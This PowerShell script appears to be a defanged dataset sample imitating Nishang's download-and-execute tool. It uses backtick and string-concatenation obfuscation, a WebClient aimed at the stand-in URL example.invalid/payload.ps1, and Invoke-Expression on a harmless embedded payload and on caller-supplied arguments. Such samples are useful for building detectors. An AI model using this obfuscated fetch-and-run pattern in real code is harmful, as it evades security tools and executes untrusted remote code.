function D`O`WNlOAd-`eX`Ec`UTE-`Ps {
    [CmdletBinding()]
    param(
        [Parameter(mANdAtoRY = $true)]
        [string]$ScriptURL,
        [string]$Arguments,
        [switch]$NoDownload
    )
    $artifactDir = Join-Path $PSScriptRoot "artifacts\delivery"
    if (-not (Test-Path $artifactDir)) {
        $null = New-Item -ItemType ('Dir'+'e'+'ctory') -Path $artifactDir -Force
    }
    $client = New-Object ('N'+'e'+'t.Web'+'C'+'lient')
    $client."HeA`d`ErS"["User-Agent"] = "Dataset-Nishang-SafeSample"
    if ($NoDownload) {
        Write-Output "[safe] Simulating in-memory download from $ScriptURL"
        $downloadedScript = @'
function Invoke-FakePayload {
    param([string]$Message = "hello")

    Write-Output "[safe] In-memory payload executed."
    Write-Output "[safe] Payload message: $Message"
}
'@
        Invoke-Expression $downloadedScript
        if ($Arguments) {
            Write-Output "[safe] Executing downloaded arguments in memory."
            Invoke-Expression $Arguments
        }
    }
    else {
        $filePath = Join-Path $artifactDir "downloaded-safe-payload.ps1"
        $payloadFile = @'
param([string]$Message = "hello")

Write-Output "[safe] Disk payload executed."
Write-Output "[safe] Payload message: $Message"
'@
        Set-Content -Path $filePath -Value $payloadFile -Encoding ('UT'+'F8')
        Write-Output "[safe] Simulating download to $filePath from $ScriptURL"
        if ($Arguments) {
            & $filePath $Arguments
        }
        else {
            & $filePath
        }
    }
}
DOWNlOAd-eXEcUTE-Ps `
    -ScriptURL "https://example.invalid/payload.ps1" `
    -Arguments "Invoke-FakePayload -Message 'hello'" `
    -NoDownload
